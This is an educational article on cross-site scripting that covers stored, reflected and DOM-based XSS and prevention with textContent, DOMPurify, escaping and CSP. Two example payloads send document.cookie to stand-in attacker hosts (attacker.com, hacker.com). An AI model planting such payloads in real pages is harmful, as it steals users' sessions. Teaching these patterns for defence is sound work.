# Cross-Site Scripting (XSS)

Cross-site scripting (XSS) is a critical web security vulnerability where an attacker injects malicious scripts into a trusted website. When a victim visits the compromised page, the script executes in their browser, allowing the attacker to steal sensitive data like cookies, session tokens, or perform actions on behalf of the user.

---

## How XSS Takes Place

XSS typically occurs when an application includes untrusted data in a web page without proper validation or escaping.

**Example of Vulnerable Code:**

```javascript
const userStoredInput =
  "<script>fetch('https://attacker.com/steal?cookie=' + document.cookie)</script>";
const element = document.getElementById("#main");

// Dangerous: innerHTML directly injects the string into the DOM
element.innerHTML = userStoredInput;
```

---

## Categories of XSS (OWASP)

### 1. Stored XSS (Persistent)

The malicious script is **permanently stored** on the target server (e.g., in a database, in a comment field, user profile, etc.). When a user navigates to the affected page, the script is retrieved and executed.

- **Example Scenario:** A chat application that doesn't sanitize messages.
- **Attack:** An attacker sends a message: `Hello <script>location.href='http://hacker.com?cookie='+document.cookie</script>`.
- **Impact:** Every user (including admins) who opens that chat will have their session stolen.

### 2. Reflected XSS (Non-Persistent)

The script is **"reflected"** off a web application to the victim's browser. It usually arrives via a URL parameter or form submission and is not stored on the server.

- **Example Scenario:** A search page that displays the search query back to the user.
- **URL:** `https://example.com/search?q=<script>alert('XSS')</script>`
- **Attack:** The attacker tricks a user into clicking a specially crafted link (Phishing).
- **Impact:** The script runs immediately in the context of the user who clicked the link.

### 3. DOM-Based XSS

The vulnerability exists entirely in the **client-side code** rather than server-side code. The script is executed when the application contains a "source" (like `location.hash`) that flows into a "sink" (like `innerHTML`) that supports dynamic code execution.

- **Source:** `window.location.hash`
- **Sink:** `document.write()`, `element.innerHTML`, `eval()`
- **Example:** `https://site.com/#<img src=x onerror=alert(1)>` logic that reads the hash and injects it into the DOM.

---

## Prevention Strategies

### 1. Sanitize Data

Always sanitize user input before rendering.

- **Modern Frameworks:** React, Angular, and Vue automatically sanitize data. In React, you must explicitly use `dangerouslySetInnerHTML` to bypass this, which acts as a warning.

### 2. Use Safe Sinks

Instead of using `innerHTML`, use safer alternatives that treat input as plain text:

- **Safe:** `element.textContent = data;`
- **Safe:** `document.createTextNode(data);`

### 3. HTML Sanitization Libraries

Use battle-tested libraries like **DOMPurify** to clean HTML strings before injecting them into the DOM.

```javascript
import DOMPurify from "dompurify";
const cleanHTML = DOMPurify.sanitize(dirtyHTML);
element.innerHTML = cleanHTML;
```

### 4. Escape HTML Tags

Convert special characters into HTML entities to prevent the browser from interpreting them as code:

- `<` becomes `&lt;`
- `>` becomes `&gt;`
- `&` becomes `&amp;`

### 5. Content Security Policy (CSP)

Implement a strong CSP header to restrict which scripts can execute on your page. CSP can disable inline scripts and specify a whitelist of trusted domains for external resources.

---

## Conclusion

While XSS may seem simple, attackers use sophisticated obfuscation techniques. As a developer, the best defense is a **"Never Trust User Input"** policy combined with modern framework protections and robust sanitization.
